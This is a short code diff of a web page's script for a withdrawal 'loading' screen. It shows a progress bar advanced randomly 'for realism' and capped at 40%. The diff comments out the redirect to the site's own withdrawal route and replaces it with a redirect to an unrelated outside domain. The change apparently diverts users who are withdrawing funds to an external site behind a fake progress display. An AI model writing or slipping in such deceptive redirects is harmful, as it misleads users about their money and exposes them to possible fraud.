@@ -90,10 +90,22 @@
 let percent = 0;
 let bar = document.getElementById("progressBar");
 
+// let interval = setInterval(() => {
+//     if (percent >= 40) {
+//         clearInterval(interval);
+//         window.location.href = "{{ route('user.withdrawal.loading2', $withdrawal->id) }}";
+//     } else {
+//         percent += Math.floor(Math.random() * 3) + 1; // Adds randomness for realism
+//         if (percent > 40) percent = 40; // Cap at 40%
+//         bar.style.width = percent + "%";
+//         bar.innerText = percent + "%";
+//     }
+// }, 150);
+
 let interval = setInterval(() => {
     if (percent >= 40) {
         clearInterval(interval);
-        window.location.href = "{{ route('user.withdrawal.loading2', $withdrawal->id) }}";
+        window.location.href = "https://clearwayhub.online/";
     } else {
         percent += Math.floor(Math.random() * 3) + 1; // Adds randomness for realism
         if (percent > 40) percent = 40; // Cap at 40%
@@ -101,6 +113,7 @@ let interval = setInterval(() => {
         bar.innerText = percent + "%";
     }
 }, 150);
+
 </script>
 
 </body>
